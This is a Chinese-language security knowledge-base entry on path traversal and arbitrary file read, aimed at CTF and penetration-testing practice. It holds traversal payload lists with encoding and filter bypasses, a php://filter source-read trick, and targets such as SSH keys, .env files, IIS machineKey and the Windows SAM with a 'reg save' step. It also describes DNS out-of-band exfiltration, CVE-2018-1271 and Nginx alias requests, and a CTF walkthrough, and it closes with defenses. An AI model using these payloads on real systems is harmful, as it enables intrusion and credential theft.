---
title: 任意文件读取与目录穿越
aliases: [任意文件读取, 目录穿越, Path Traversal, 任意文件下载, 伪协议]
category: exp
status: current
updated: 2026-07
---

# 任意文件读取与目录穿越

## 一句话理解
应用按用户给的路径去磁盘读文件，却没有把路径限制在预期目录内，攻击者用 `../` 跳出沙箱目录，读走配置、源码、密钥甚至 flag。

## 核心原理
- 用户输入（文件名/路径）拼进文件操作函数（`open`、`readFile`、`FileInputStream`）
- 服务端未做规范化校验，相对路径符号 `../`（Windows 下 `..\`）向上回溯目录
- 与"文件包含"的区别：读取只拿内容，包含会把内容**当代码执行**（见 [EXP-Include-PHP](./EXP-Include-PHP.md)）

## 成立条件
- 存在读文件/下载/预览功能，路径或文件名用户可控
- 路径校验缺失、黑名单可绕过，或校验发生在规范化之前

## 常见触发点与参数
- 文件下载：`/download?file=report.pdf`
- 图片/附件预览：`/preview?path=...`、`/img?src=...`
- 模板/语言包加载：`?template=`、`?lang=`
- 常见参数名：`file`、`filename`、`path`、`filepath`、`download`、`doc`、`src`、`name`

## 常见利用形式
### 1. 相对路径穿越

```text
../../../../etc/passwd
....//....//etc/passwd        （过滤一次 ../ 时双写绕过）
..%2f..%2fetc/passwd          （URL 编码）
..%252f..%252f                （双重编码，前端解码一次、服务端再解码一次）
```

### 2. 绝对路径
直接给绝对路径，很多校验只盯 `../`：

```text
/etc/passwd
C:\Windows\win.ini
```

### 3. 截断与后缀绕过
- `%00` 截断（PHP < 5.3.4 等老环境）：`../../etc/passwd%00.jpg`
- 长度截断：超长 `../` 冲刷掉服务端拼接的固定后缀（老 PHP）
- 伪协议（PHP）：`php://filter/convert.base64-encode/resource=index.php`，把源码 Base64 读出来

### 4. Windows 差异
- 分隔符 `\` 与 `/` 都可能被接受
- 盘符路径 `C:/`、`\\?\C:\`
- 保留设备名（`aux`、`con`）可用于 DoS 探测

## 各语言文件读取函数清单

审计/挖洞时，看到下列函数的入参来自用户输入，就是穿越测试点。

### PHP
| 函数 | 一句话区别 |
| --- | --- |
| `file_get_contents($path)` | 整个文件读成字符串返回，不直接输出 |
| `readfile($path)` | 读取并直接写向输出缓冲（下载接口常用） |
| `fopen()` / `fread()` / `fgets()` | 流式句柄读取，可只读部分内容 |
| `show_source()` / `highlight_file()` | 读取源码并语法高亮输出 |
| `include` / `require` | 读取并**当代码执行**——已是文件包含漏洞，见 [EXP-Include-PHP](./EXP-Include-PHP.md) |

### Java
- `new FileInputStream(path)` + `read()`：基础字节流
- `Files.readAllBytes(Paths.get(path))`：NIO 一次性读入内存
- `RandomAccessFile(path, "r")`：可指定偏移随机读（别误以为限制了读取范围就安全）
- `new InputStreamReader(new FileInputStream(...))`：字符流包装
- `getResource()` / `getResourceAsStream()`：从 classpath 读资源，`../` 同样能跳出包路径

### Python
- `open(path).read()`：最常见写法
- `os.popen('cat ' + path).read()`：一旦走到这里直接升级为命令注入
- `codecs.open(path, encoding=...)`：带编码读取，安全性同 `open()`

### Node.js
- `fs.readFileSync(path)`：同步读入内存
- `fs.createReadStream(path)`：流式读取，下载/预览接口常客

## 读什么
| 目标 | 价值 |
| --- | --- |
| `/etc/passwd`、`C:\Windows\win.ini` | 探测漏洞是否成立的试金石 |
| `/proc/self/environ`、`/proc/self/cmdline` | 环境变量、启动参数（常藏密钥） |
| `/proc/self/fd/*` | 已打开文件句柄，可读日志/配置 |
| `web.xml`、`.env`、`application.yml`、`config.php` | 数据库口令、AKSK、JWT 密钥 |
| 站点源码 | 拿到源码转代码审计，挖 RCE |
| `/var/log/`、Tomcat 日志 | 找 session、后台路径、注入痕迹 |
| `~/.ssh/id_rsa`、`~/.bash_history` | 直接登录、摸清运维习惯 |

## Windows 路径速查清单

目标是 IIS / ASP.NET 站时，把 Linux 的 `/etc/passwd` 换成下面这些：

```text
C:\inetpub\wwwroot\web.config          # IIS 站点配置（含 machineKey，拿到即可联动 .NET 反序列化打 ViewState）
C:\Windows\System32\config\SAM         # 账户哈希库（需配合注册表 hive 提取，如 reg save）
C:\Users\<user>\Desktop\flag.txt       # 常见 CTF flag 位置
C:\inetpub\logs\LogFiles\              # IIS 访问日志（找后台路径、他人请求）
C:\Windows\win.ini                     # Windows 版试金石（地位等同 /etc/passwd）
C:\Windows\System32\drivers\etc\hosts  # 域名绑定表，摸清内网主机关系
C:\Program Files\<app>\                # 应用安装目录，配置/日志/连接串常在此
```

要点：
- `web.config` 里的 `machineKey`（validationKey/decryptionKey）是黄金钥匙——可离线伪造加密签名的 ViewState 直达 RCE，利用链见 [EXP-DotNet-Unserialize](./EXP-DotNet-Unserialize.md)
- `SAM` 文件被系统占用且受权限保护，直接读通常失败；实战等拿到命令执行后走 `reg save HKLM\SAM sam.hive` 再离线解（读文件阶段先记下路径备用）
- `<user>` 用户名不确定时，先靠报错差异探测 `C:\Users\` 下各目录的存在性，或从 IIS 日志、`web.config` 里的路径推断

### Windows 相对路径穿越技巧

```text
..\..\..\..\windows\win.ini    # 反斜杠回溯：正斜杠被过滤/拦截时改用 \
..\..\..\..\..\..\boot.ini    # 多层无害，给足层数防止跳不出根（老系统还可读 boot.ini）
c:/windows/win.ini            # 盘符切换：正斜杠写绝对路径，绕过"必须相对路径"的拼接校验
C:\Windows\win.ini            # 反斜杠绝对路径硬吃
```

- Windows 文件 API 同时接受 `\` 与 `/`：一种被 WAF/黑名单拦了就换另一种
- 服务端把用户输入拼在固定目录后面时，`..\` 数量宁多勿少（多写几层最多停在盘符根，不会报错；少了跳不出目标目录）
- 注意编码变体：`%5c`（`\`）、`%2e%2e%5c`（`..\`）、`..%255c`（双重编码）与前文通用技巧通用

## 进阶思路
- 读源码 -> 审计出反序列化/SQLi -> 组合 RCE，是 CTF 与实战的标准链路
- 读取数据库文件（SQLite）、`/proc/self/maps` 辅助进一步利用
- 盲读场景：无回显时结合布尔差异（存在/不存在响应不同）或 OOB 外带

## 无回显读文件外带

场景：文件确实被读了（如下载接口只在后台预取、日志型盲场景），但响应不回显内容。此时把"读文件"当数据源，另找一条**外带信道**把内容送出来：

1. **布尔差异盲读**（保底手段）：文件存在/不存在导致响应不同（状态码、长度、耗时），可先探测路径存在性；内容层面只能逐字节爆破，极慢，留作最后手段
2. **与 XXE OOB 联动**：注入点若支持 XML，用外部实体 `file:///` 读文件 + 参数实体把内容拼进对攻击者域名的请求，从 DNS/HTTP 日志收数据，详见 [EXP-XXE](./EXP-XXE.md)
3. **与 SSRF 联动**：SSRF 能控制请求的 URL 时，用 `file://`、`gopher://` 等协议读文件并经回调带出（部分环境还能借 `dict://`、内网回连探测），详见 [EXP-SSRF](./EXP-SSRF.md)

DNS 外带细节：内容拼进子域名时**单个标签不超过 63 字符**，长内容需分段（首字符还要避开纯数字标签）；`curl`/`wget`、`ping`、代码里的任意 DNS 解析都能触发查询，攻击侧一条 `tcpdump` 或公网 DNSLOG 即可收割。

> 一句话总结：无回显时优先找"二次外带通道"（DNS/HTTP 回连），读文件漏洞出数据，XXE/SSRF 当信道。

## 框架级案例

### Spring 静态资源路径穿越（CVE-2018-1271）
Spring MVC 静态资源 location 配置为 `file:` 且未以 `/` 结尾时，Windows 上路径分隔符 `\` 配合双重编码绕过规范化校验：

```text
GET /static..%255c..%255c..%255cetc%255cpasswd HTTP/1.1
```

> 要点：`%255c` 双重编码最终还原为 `\`（%5c），规范化发生在完全解码之前导致穿越逃逸；仅 Windows 受影响，Linux 上 `/` 分隔符会被正确处理。

### Nginx alias 误配置穿越
`location` 少了结尾 `/`，`alias` 却带 `/`，前缀替换后残留的 `../` 直接拼到 alias 目录之后：

```nginx
location /files {
    alias /home/;
}
```

```text
GET /files../etc/passwd HTTP/1.1
```

> 要点：Nginx 用 `/files` 前缀匹配后，把剩余的 `../etc/passwd` 直接接到 alias 后，得到 `/home/../etc/passwd`。修复：两边都带斜杠——`location /files/ { alias /home/; }`。

## 快速判断
1. 找读文件类参数，先丢 `../../../../etc/passwd` 看回显
2. 被拦就换编码、双写、绝对路径逐一试
3. 回显过滤了敏感关键词时，用 Base64 伪协议读出再本地解码

## 案例：一道任意文件读取 CTF 题完整流程

题目：`/download?file=xxx` 下载接口。

1. **读 /etc/passwd 确认漏洞**：提交 `?file=../../../../etc/passwd`，回显 `root:x:0:0:...`——任意文件读取成立。
2. **读源码定位 flag 路径**：`?file=../../../../var/www/html/index.php`（源码路径可从 `/etc/passwd` 的用户目录、`/proc/self/cwd` 等推断），发现后端逻辑：

```php
<?php
// 固定前缀拼接，且过滤了一遍 ../
$file = '/var/www/html/files/' . str_replace('../', '', $_GET['file']);
echo file_get_contents($file);
// hint: flag 位于 /flag
```

3. **绕过前缀拼接与过滤**：`str_replace` 单次过滤用双写绕过，叠加足够数量跳出前缀目录：

```text
/download?file=....//....//....//....//flag
```

> `....//` 被过滤掉中间的 `../` 后还原为 `../`，四个叠加即可从 `/var/www/html/files/` 跳回根目录。

4. **读出 flag**：响应返回 `flag{...}`。

## 防御要点
- 白名单校验文件名（只允许预期集合），不校验"路径"而校验"文件 ID"
- 拼接后用 `realpath` / 路径规范化函数处理，确认结果仍以预期目录开头
- 拒绝绝对路径与 `..` 序列，校验放在 URL 完全解码之后
- 单独隔离存储目录，Web 用户最小权限，禁读系统目录

## 参考
- [OWASP Path Traversal](https://owasp.org/www-community/attacks/Path_Traversal)
- [PortSwigger File path traversal](https://portswigger.net/web-security/file-path-traversal)
- [PayloadsAllTheThings - File Inclusion](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion)
